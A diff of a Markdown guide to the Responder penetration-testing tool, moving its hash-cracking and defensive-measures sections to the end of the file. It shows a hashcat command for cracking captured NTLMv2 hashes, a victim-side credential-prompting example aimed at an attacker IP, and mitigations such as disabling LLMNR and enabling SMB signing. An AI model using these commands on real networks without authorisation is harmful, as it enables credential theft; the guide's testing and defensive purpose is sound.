@@ -332,57 +332,7 @@ Responder runs multiple rogue servers simultaneously to handle different types o
 - **Example**: When a victim runs:
   ```powershell
   New-PSSession -ComputerName <attacker_ip> -Credential (Get-Credential)
-  ```
-
-## Cracking Captured Hashes
-
-After collecting NTLM hashes, use Hashcat to crack them:
-
-```bash
-hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt
-```
-
-Where:
-- `-m 5600` specifies the hash type (NTLMv2)
-- `<hash_file>` is the path to your captured hash file
-- The last parameter is the path to your wordlist
-
-For other NTLM hash types:
-- NTLMv1: `-m 5500`
-- NetNTLMv1: `-m 5550`
-- NetNTLMv2: `-m 5600` (most common from Responder)
-
-## Defensive Measures
-
-To protect against Responder attacks:
-
-1. **Disable LLMNR and NBT-NS**:
-   - Via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled
-   - Via Registry: 
-     ```
-     reg add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v "EnableMulticast" /t REG_DWORD /d "0" /f
-     ```
-
-2. **Implement Network Access Control**:
-   - Restrict which devices can connect to the network
-   - Use 802.1X authentication for network access
-
-3. **Use Strong Passwords**:
-   - Complex passwords are harder to crack even if hashes are captured
-   - Consider password length of 14+ characters
-
-4. **Mitigate WPAD Attacks**:
-   - Add a legitimate WPAD entry in your DNS server
-   - Disable automatic proxy discovery in browsers
-   - Block outbound traffic on UDP 137, 138, 1900, and TCP 5355
-
-5. **Enable SMB Signing**:
-   - Prevents SMB relay attacks
-   - Via Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network client: Digitally sign communications (always) → Enabled
-
-6. **Monitor Network Traffic**:
-   - Look for unusual authentication attempts
-   - Monitor for multiple failed authentication attempts
+   ```
 
 ## Command Reference Sheet
 
@@ -533,3 +483,54 @@ For busy networks or large-scale assessments:
    - Create scripts to automate the workflow from capture to cracking
    - Set up filters to prioritize administrative accounts
    - Develop custom reporting for easier analysis
+
+## Cracking Captured Hashes
+
+After collecting NTLM hashes, use Hashcat to crack them:
+
+```bash
+hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt
+```
+
+Where:
+- `-m 5600` specifies the hash type (NTLMv2)
+- `<hash_file>` is the path to your captured hash file
+- The last parameter is the path to your wordlist
+
+For other NTLM hash types:
+- NTLMv1: `-m 5500`
+- NetNTLMv1: `-m 5550`
+- NetNTLMv2: `-m 5600` (most common from Responder)
+
+## Defensive Measures
+
+To protect against Responder attacks:
+
+1. **Disable LLMNR and NBT-NS**:
+   - Via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled
+   - Via Registry: 
+     ```
+     reg add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v "EnableMulticast" /t REG_DWORD /d "0" /f
+     ```
+
+2. **Implement Network Access Control**:
+   - Restrict which devices can connect to the network
+   - Use 802.1X authentication for network access
+
+3. **Use Strong Passwords**:
+   - Complex passwords are harder to crack even if hashes are captured
+   - Consider password length of 14+ characters
+
+4. **Mitigate WPAD Attacks**:
+   - Add a legitimate WPAD entry in your DNS server
+   - Disable automatic proxy discovery in browsers
+   - Block outbound traffic on UDP 137, 138, 1900, and TCP 5355
+
+5. **Enable SMB Signing**:
+   - Prevents SMB relay attacks
+   - Via Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network client: Digitally sign communications (always) → Enabled
+
+6. **Monitor Network Traffic**:
+   - Look for unusual authentication attempts
+   - Monitor for multiple failed authentication attempts
+
